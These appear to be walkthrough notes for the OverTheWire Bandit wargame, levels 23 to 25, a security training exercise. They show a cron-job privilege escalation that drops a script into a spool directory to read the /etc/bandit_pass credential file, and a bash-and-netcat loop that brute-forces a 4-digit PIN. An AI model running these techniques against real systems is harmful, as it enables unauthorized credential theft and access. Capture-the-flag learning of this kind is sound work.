# OverTheWire: Bandit Walkthrough Notes (Levels 23–25)

## Level 23 -> Level 24: Cron Job Privilege Escalation via Custom Bash Script

* **Goal:** Exploit `/usr/bin/cronjob_bandit24.sh` (which automatically executes and deletes any script placed inside `/var/spool/bandit24/foo/` as user `bandit24`) to exfiltrate `/etc/bandit_pass/bandit24`.
* **Commands Used:**
  * `mkdir /tmp/furkan24 && cd /tmp/furkan24`
  * `echo '#!/bin/bash' > al.sh`
  * `echo 'cat /etc/bandit_pass/bandit24 > /tmp/furkan24/sifre.txt' >> al.sh`
  * `chmod 777 /tmp/furkan24 && chmod +x al.sh`
  * `cp al.sh /var/spool/bandit24/foo/`
  * `cat /tmp/furkan24/sifre.txt`
* **Key Takeaway:** Automated scheduled jobs executing scripts from writable spool directories allow full privilege escalation if permissions are misconfigured.

---

## Level 24 -> Level 25: Automated 4-Digit PIN Brute-Force with Bash & Netcat

* **Goal:** Brute-force a local daemon listening on `localhost:30002` that requires `<bandit24_password> <4_digit_PIN>` (`0000`–`9999`).
* **Command Used:**
  * `for i in {0000..9999}; do echo "<BANDIT24_PASSWORD> $i"; done | nc localhost 30002 | grep -v "Wrong!"`
* **Breakdown:**
  * `for i in {0000..9999}; do ... done` : Generates all 10,000 possible 4-digit PIN combinations.
  * `| nc localhost 30002` : Streams all 10,000 attempts over a single Netcat TCP connection.
  * `| grep -v "Wrong!"` : Filters out failed attempts (`-v` = invert match) to display only the winning password.
* **Key Takeaway:** Combining Bash loops (`for`), Netcat (`nc`), and text filtering (`grep -v`) enables rapid automated service testing without external tools.
